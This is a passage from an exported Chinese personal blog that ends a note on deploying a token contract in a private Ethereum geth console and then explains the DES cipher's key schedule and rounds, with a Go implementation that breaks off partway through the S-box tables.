<p><strong>预估合约部署手续费： <code>web3.eth.estimateGas(&#123;data: bytecode&#125;)</code></strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解锁账户</span></span><br><span class="line">personal.unlockAccount(eth.accounts[0])</span><br></pre></td></tr></table></figure>
<p><img src="../img/image-20230409151357192.png" alt="解锁账户"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 初始化</span></span><br><span class="line"></span><br><span class="line">initializer = &#123;from: eth.accounts[0], data: bytecode, gas: 400000&#125;</span><br><span class="line"></span><br><span class="line">token = myContract.new(&#123;data: bytecode, gas: 4000000, from: eth.accounts[0]&#125;)</span><br></pre></td></tr></table></figure>
<p><img src="../img/image-20230409151621183.png" alt="初始化"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># token address</span></span><br><span class="line">token.address</span><br></pre></td></tr></table></figure>
<p><img src="../img/image-20230409152421990.png" alt="address"></p>
<p><strong>挖矿对合约地址进行确认</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">miner.start(1)</span><br></pre></td></tr></table></figure>
<p><img src="../img/image-20230409152539206.png" alt="地址"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 获取合约对象</span></span><br><span class="line"></span><br><span class="line">objContract = eth.contract(abi)</span><br></pre></td></tr></table></figure>
<p><img src="../img/image-20230409152718535.png" alt="获取合约对象"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 实例化</span></span><br><span class="line"></span><br><span class="line">buildContract = objContract.at(token.address)</span><br></pre></td></tr></table></figure>
<p><img src="../img/image-20230409153010135.png" alt="实例化"></p>
<p><img src="../img/image-20230409153045897.png" alt="方法"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 实例化为buildContract  	将初始货币分配1000个</span></span><br><span class="line">buildContract.Mytoken = <span class="string">&quot;1000&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="../../../server/source/img/image-20230424192405989.png" alt="image-20230424192405989"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 调用transfer给指定账户转账</span></span><br><span class="line">buildContract.transfer(eth.accounts[1], 20)</span><br></pre></td></tr></table></figure>
<p><img src="../../../server/source/img/image-20230424192520967.png" alt="image-20230424192520967"></p>
]]></content>
      <tags>
        <tag>experiment</tag>
      </tags>
  </entry>
  <entry>
    <title>DES算法过程剖析及实现</title>
    <url>/archives/e9dc9fd2.html</url>
    <content><![CDATA[<h2 id="背景">背景</h2>
<p>    DES加密算法由NBS(美国国家标准局)颁布于1977年, 这套算法由IBM公司研制,并于1998年12月起出于密钥长度的原因, NBS停止使用DES.其后替代以AES为加密标准的新算法.</p>
<p>    该算法的分组长度是64比特，密钥长度为56比特，属于Feistel结构密码 迭代轮数为16轮。Feistel结构密码的一大特点是加解密一致，因此算法实现时占用资源少、效率高。采用DES算法加密时，64比特的明文首先经过一个初始置换然后通过由轮密钥控制的16轮迭代变换，最后再通过初始置换的逆变换进而得到密文。</p>
<h2 id="加密流程">加密流程</h2>
<h3 id="表置换原理">表置换原理</h3>
<p>PC-1、PC-2、IP、IP逆以及P表置换原理相同, 例子如下</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">置换表P [3,6,4,1,2,5]  原数据表D[11,22,33,44,55,66,77]</span><br><span class="line"></span><br><span class="line">置换后的表N[D[P[0]], D[P[1], D[P[2]], D[P[3]], D[P[4]], D[P[5]]]</span><br><span class="line">N = [44, 77, 55, 22, 33, 66] N的长度与P一致</span><br></pre></td></tr></table></figure>
<h3 id="种子密钥扩展">种子密钥扩展</h3>
<p>​	<img src="../img/image-20220805160147312.png" alt="种子密钥扩展图"></p>
<ol>
<li>
<p>将预先给定的64bit的密钥按PC-1表进行置换, 即将第8, 16, 24, 32, 40, 48, 56, 64位去掉并且打乱密钥的排序 这里DES需要的其实是56bit的密钥,被去掉的位为奇偶校验位,只是为了保证密钥不出错,但为了密钥记录方便,这里直接写入64bit的字符串.</p>
</li>
<li>
<p>种子密钥K经过PC-1置换缩小为56bit的新密钥<code>PC-1(K)</code>这里PC-1(K) = C0D0,C0D0为其左右两个部分,各28bit.PC-1表如下:</p>
<p><img src="../img/image-20220805164141887.png" alt="image-20220805164141887"></p>
<p>之后按照左移表分别进行<strong>循环左移</strong>, 左移表如下:</p>
</li>
</ol>
<p><img src="../img/image-20220805163035304.png" alt="image-20220805163035304"></p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">demo</span><br><span class="line"><span class="code">	[1,2,3,4,5] i=1 对应ti=1(偏移量) ======&gt;  [2,3,4,5,1]</span></span><br></pre></td></tr></table></figure>
<ol start="3">
<li>左移之后将新生成的CiDi复制一份,循环执行2中左移的操作.</li>
</ol>
<p>​	   CiDi接下来继续进行PC-2置换, 生成PC-2(CiDi)  = Ki(48bit) PC-2表如下</p>
<p><img src="../img/image-20220805165015954.png" alt="PC-2置换表"></p>
<h3 id="明文加密">明文加密</h3>
<p><img src="../img/image-20220805171610888.png" alt="image-20220805171610888"></p>
<ol>
<li>
<p>将明文X通过IP置换为IP(x) 此时IP(x) 仍为64bit</p>
</li>
<li>
<p>拆分IP(X)为L0, R0两部分,分别占32bit.</p>
</li>
<li>
<p>对R0进行F函数运算:</p>
<ol>
<li>
<p>E扩展</p>
<p>R0经过扩展变换E获得48bit的新变量E(R0), E表如下</p>
<p><img src="../img/image-20220805172330114.png" alt="image-20220805172330114"></p>
</li>
<li>
<p>与子密钥Ki进行异或运算, 此时E(Ri)与子密钥Ki都是48bit, 获得B=E®⊕Ki</p>
</li>
<li>
<p>S盒压缩, 将得到的B(48bit)分成八组, 每6bit, 其中第一,最后一位拼接,中间四位拼接,例如  B<sub>1</sub>B<sub>2</sub>B<sub>3</sub>B<sub>4</sub>B<sub>5</sub>B<sub>6</sub>, 其中B<sub>1</sub>与B<sub>6</sub>组成S盒的行数,B<sub>2</sub>B<sub>3</sub>B<sub>4</sub>B<sub>5</sub>对应S盒的列数</p>
<p>s1 =[<br>
14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7,<br>
0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8,<br>
4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0,<br>
15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13<br>
]</p>
<p>这里S盒中 第0行为14,4,13……所在行, 依次往后推, 第0列为14,0,4,15所在列,依次往后推, 假设B = [011001 110011 ……] , 其中的011001, B1B6=01对应第1行, B2B3B4B5=1100,对应第12列,查表S1可得对应转换的数为9=1001. 以此类推,将48bit的数据压缩到32bit( 每组减少2bit, 2*8=16),名为变量C</p>
</li>
<li>
<p>P盒置换, 将C通过P表进行置换为P©,P表如下:<br>
<img src="../img/image-20220805180734819.png" alt="image-20220805180734819"></p>
</li>
</ol>
</li>
<li>
<p>P©与L<sub>0</sub>异或得到L<sub>1</sub>,并令R<sub>1</sub>=L<sub>0</sub>, 将L<sub>1</sub>,R<sub>2</sub>重复2-4(大)步骤,一直到第十六轮</p>
</li>
<li>
<p>对L<sub>16</sub>, R<sub>16</sub>进行IP逆置换,Y = IP<sup>-1</sup>(R<sub>16</sub>, L<sub>16</sub>),此时Y就是密文. 这里注意左右密钥位置</p>
</li>
</ol>
<h2 id="解密过程分析">解密过程分析</h2>
<p><img src="../img/image-20220805183258166.png" alt="image-20220805183258166"></p>
<p>​          算法支撑部分目前没能力分析, 对合变换这块没看太懂</p>
<p>​		**解密时将子密钥逆置即可实现 **</p>
<p>​</p>
<p>​</p>
<h2 id="代码实现-Golang">代码实现(Golang)</h2>
<h3 id="子密钥生成">子密钥生成</h3>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">generateKey</span><span class="params">(data <span class="type">string</span>)</span></span> [][]<span class="type">int</span> &#123;</span><br><span class="line">	formKey := byteConBit(data)</span><br><span class="line">	resList := <span class="built_in">make</span>([][]<span class="type">int</span>, <span class="number">16</span>, <span class="number">48</span>)</span><br><span class="line">	<span class="keyword">var</span> off = []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// pc-1置换</span></span><br><span class="line">	formKey = displace(pc1Table, formKey, <span class="built_in">len</span>(pc1Table))</span><br><span class="line">	leftKey := formKey[:<span class="built_in">len</span>(formKey)/<span class="number">2</span>]</span><br><span class="line">	rightKey := formKey[<span class="built_in">len</span>(formKey)/<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">	TempresList := <span class="built_in">make</span>([][]<span class="type">int</span>, <span class="number">16</span>, <span class="number">56</span>)</span><br><span class="line">	<span class="comment">// 双左移且迭代16次</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(off); i++ &#123;</span><br><span class="line">		leftKey = leftOffX(leftKey, off[i])</span><br><span class="line">		rightKey = leftOffX(rightKey, off[i])</span><br><span class="line">		TempresList[i] = <span class="built_in">append</span>(leftKey, rightKey...)</span><br><span class="line">		resList[i] = displace(pc2Table, TempresList[i], <span class="built_in">len</span>(pc2Table))</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// pc-2置换</span></span><br><span class="line">	<span class="keyword">return</span> resList</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>这里的PC-1置换中displace函数如下:</strong></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">displace</span><span class="params">(table []<span class="type">int</span>, data []<span class="type">int</span>, length <span class="type">int</span>)</span></span> []<span class="type">int</span> &#123;</span><br><span class="line">	resTable := <span class="built_in">make</span>([]<span class="type">int</span>, length)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; length; i++ &#123;</span><br><span class="line">		resTable[i] = data[table[i]<span class="number">-1</span>]</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> resTable</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>table就是对应的表, data是要修改的数据, 最后按照表的逻辑结构返回一个长度为length的新数组</p>
<p><strong>leftOffX函数如下</strong></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">leftOffX</span><span class="params">(key []<span class="type">int</span>, off <span class="type">int</span>)</span></span> []<span class="type">int</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">append</span>(key[off:], key[:off]...)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中off是偏移量, key是要修改的数据, 之后PC-2跟PC-1用的同一个函数,置换后的子密钥全都存放在resList数组里</p>
<h3 id="加密">加密</h3>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">des</span><span class="params">(data <span class="type">string</span>, cipherKey <span class="type">string</span>)</span></span> (resList []<span class="type">int</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(data)%<span class="number">8</span> != <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">var</span> crush <span class="type">byte</span></span><br><span class="line">		<span class="comment">// 填充字符串</span></span><br><span class="line">		dataLackLength := <span class="number">8</span> - <span class="built_in">len</span>(data)%<span class="number">8</span></span><br><span class="line">		<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; dataLackLength; i++ &#123;</span><br><span class="line">			data += <span class="type">string</span>(crush)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	plainText := displace(ipDisplace, byteConBit(data), <span class="built_in">len</span>(ipDisplace))</span><br><span class="line">	<span class="comment">// 子密钥生成</span></span><br><span class="line">	childrenKeyList := generateKey(cipherKey) <span class="comment">// 16轮子密钥获取 Ki</span></span><br><span class="line">	<span class="comment">// 加密</span></span><br><span class="line">	leftData := plainText[:<span class="built_in">len</span>(plainText)/<span class="number">2</span>]</span><br><span class="line">	rightData := plainText[<span class="built_in">len</span>(plainText)/<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(childrenKeyList); i++ &#123;</span><br><span class="line">		leftData, rightData = goRound(leftData, rightData, childrenKeyList[i])</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// print(&quot;迭代结果:&quot;)</span></span><br><span class="line">	<span class="comment">// fmt.Println(append(leftData, rightData...))</span></span><br><span class="line">	resList = displace(reIpDisplace, <span class="built_in">append</span>(rightData, leftData...), <span class="number">64</span>)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里填充字符的方式是EBC, 不适合加密文件,会造成空白以及重复</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(data)%<span class="number">8</span> != <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">var</span> crush <span class="type">byte</span></span><br><span class="line">		<span class="comment">// 填充字符串</span></span><br><span class="line">		dataLackLength := <span class="number">8</span> - <span class="built_in">len</span>(data)%<span class="number">8</span></span><br><span class="line">		<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; dataLackLength; i++ &#123;</span><br><span class="line">			data += <span class="type">string</span>(crush)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">// data=11001      填充后data=00011001</span></span><br></pre></td></tr></table></figure>
<p><strong>byteConBit函数</strong>: 将输入的字符串全转换为64bit的数组, 不够的前边用0填充</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">byteConBit</span><span class="params">(data <span class="type">string</span>)</span></span> (initDataList []<span class="type">int</span>) &#123;</span><br><span class="line">	newData := []<span class="type">uint8</span>(data) <span class="comment">// 将数据全部转化为比特</span></span><br><span class="line">	initDataList = <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">64</span>)</span><br><span class="line">	toBinaryList := <span class="string">&quot;&quot;</span> <span class="comment">// 存放下边填充后的toBinary</span></span><br><span class="line">	<span class="keyword">for</span> _, v := <span class="keyword">range</span> newData &#123;</span><br><span class="line">		<span class="comment">// newData组里每个元素都转为2进制</span></span><br><span class="line">		toBinary := strconv.FormatUint(<span class="type">uint64</span>(v), <span class="number">2</span>)</span><br><span class="line">		<span class="keyword">for</span> <span class="built_in">len</span>(toBinary) &lt; <span class="number">8</span> &#123;</span><br><span class="line">			toBinary = <span class="string">&quot;0&quot;</span> + toBinary</span><br><span class="line">		&#125;</span><br><span class="line">		toBinaryList += toBinary</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(toBinaryList); i++ &#123;</span><br><span class="line">		initDataList[i], _ = strconv.Atoi(<span class="type">string</span>(toBinaryList[i])) <span class="comment">// 这里如果不满足指定位数会大端序补零</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="完整代码">完整代码</h2>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;strconv&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">author: i4mhmh</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ip置换</span></span><br><span class="line"><span class="keyword">var</span> ipDisplace = []<span class="type">int</span>&#123;</span><br><span class="line">	<span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>,</span><br><span class="line">	<span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">	<span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>,</span><br><span class="line">	<span class="number">64</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>,</span><br><span class="line">	<span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>,</span><br><span class="line">	<span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line">	<span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>,</span><br><span class="line">	<span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ip逆置换</span></span><br><span class="line"><span class="keyword">var</span> reIpDisplace = []<span class="type">int</span>&#123;</span><br><span class="line">	<span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">32</span>,</span><br><span class="line">	<span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">	<span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>,</span><br><span class="line">	<span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">	<span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>,</span><br><span class="line">	<span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">	<span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>,</span><br><span class="line">	<span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// f函数部分表</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ebox = []<span class="type">int</span>&#123;</span><br><span class="line">	<span class="number">32</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>,</span><br><span class="line">	<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>,</span><br><span class="line">	<span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>,</span><br><span class="line">	<span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>,</span><br><span class="line">	<span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">	<span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>,</span><br><span class="line">	<span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>,</span><br><span class="line">	<span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">1</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> pc1Table = []<span class="type">int</span>&#123;</span><br><span class="line">	<span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>,</span><br><span class="line">	<span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>,</span><br><span class="line">	<span class="number">10</span>, <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>,</span><br><span class="line">	<span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>,</span><br><span class="line">	<span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>,</span><br><span class="line">	<span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>,</span><br><span class="line">	<span class="number">14</span>, <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>,</span><br><span class="line">	<span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> pc2Table = []<span class="type">int</span>&#123;</span><br><span class="line">	<span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">5</span>,</span><br><span class="line">	<span class="number">3</span>, <span class="number">28</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>,</span><br><span class="line">	<span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">26</span>, <span class="number">8</span>,</span><br><span class="line">	<span class="number">16</span>, <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">2</span>,</span><br><span class="line">	<span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>,</span><br><span class="line">	<span class="number">30</span>, <span class="number">40</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>,</span><br><span class="line">	<span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>, <span class="number">34</span>, <span class="number">53</span>,</span><br><span class="line">	<span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sBoxzip = [][]<span class="type">int</span>&#123;</span><br><span class="line">	&#123;<span class="number">14</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">7</span>,</span><br><span class="line">		<span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>,</span><br><span class="line">		<span class="number">4</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">0</span>,</span><br><span class="line">		<span class="number">15</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">13</span>&#125;,</span><br><span class="line">	&#123;<span class="number">15</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>,</span><br><span class="line">		<span class="number">3</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">5</span>,</span><br><span class="line">		<span class="number">0</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">15</span>,</span><br><span class="line">		<span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">9</span>&#125;,</span><br><span class="line">	&#123;<span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">8</span>,</span><br><span class="line">		<span class="number">13</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">1</span>,</span><br><span class="line">		<span class="number">13</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">7</span>,</span><br><span class="line">		<span class="number">1</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">12</span>&#125;,</span><br><span class="line">	&#123;<span class="number">7</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">15</span>,</span><br><span class="line">		<span class="number">13</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">9</span>,</span><br><span class="line">		<span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">2</span>, 